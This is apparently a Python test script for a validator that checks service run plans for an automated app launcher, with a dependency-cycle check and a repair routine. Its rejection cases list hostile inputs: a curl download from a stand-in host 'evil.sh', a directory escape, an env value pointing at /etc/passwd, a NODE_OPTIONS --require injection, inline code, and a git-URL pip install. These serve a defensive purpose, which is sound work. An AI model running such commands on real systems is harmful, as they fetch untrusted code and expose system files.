import tempfile
from pathlib import Path
from schema import RunPlan
from validator import validate_plan
from repair import try_rules

ws = tempfile.mkdtemp(); (Path(ws) / "backend").mkdir(); (Path(ws) / "frontend").mkdir()

good = RunPlan.model_validate({
  "services": [
    {"name": "api", "role": "backend", "cwd": "backend", "install": ["uv pip install -r requirements.txt"],
     "start": "uvicorn app.main:app --host {HOST} --port {PORT}", "env": {"DATABASE_URL": "sqlite:///./s.db"},
     "readiness": {"type": "http", "path": "/docs"}},
    {"name": "web", "role": "frontend", "cwd": "frontend", "install": ["npm ci"],
     "start": ["npm", "run", "dev", "--", "--host", "{HOST}", "--port", "{PORT}"],
     "env": {"VITE_API_URL": "{services.api.url}"}, "depends_on": ["api"]}],
  "entry_service": "web", "confidence": 0.9})
assert validate_plan(good, ws) == [], validate_plan(good, ws)

def bad(**kw):
    s = {"name": "x", "role": "backend", "start": ["python", "app.py"]}; s.update(kw)
    return RunPlan.model_validate({"services": [s], "entry_service": "x"})

cases = {
  "shell op":      bad(install=["npm ci || npm install"]),
  "curl binary":   bad(install=[["curl", "http://evil.sh"]]),
  "cwd escape":    bad(cwd="../.."),
  "inline code":   bad(start=["python", "-c", "import os"]),
  "host path env": bad(env={"DATA": "/etc/passwd"}),
  "blocked env":   bad(env={"NODE_OPTIONS": "--require x"}),
  "git install":   bad(install=[["pip", "install", "git+https://x/y.git"]]),
  "bad placeholder": bad(start=["python", "app.py", "{SECRET}"]),
}
for name, p in cases.items():
    errs = validate_plan(p, ws); assert errs, f"{name} was NOT rejected"; print("rejected:", name, "->", errs[0])

cyc = RunPlan.model_validate({"services": [
  {"name": "a", "role": "backend", "start": ["python", "a.py"], "depends_on": ["b"]},
  {"name": "b", "role": "backend", "start": ["python", "b.py"], "depends_on": ["a"]}], "entry_service": "a"})
assert any("cycle" in e for e in validate_plan(cyc, ws)); print("rejected: cycle")

r = try_rules(good, "api", "ModuleNotFoundError: No module named 'yaml'\nKeyError: 'SECRET_KEY'\nOSError: [Errno 98] Address already in use")
print("repair:", r.rules, good.services[0].env)
assert r.reallocate_port and "SECRET_KEY" in good.services[0].env
print("ALL OK")
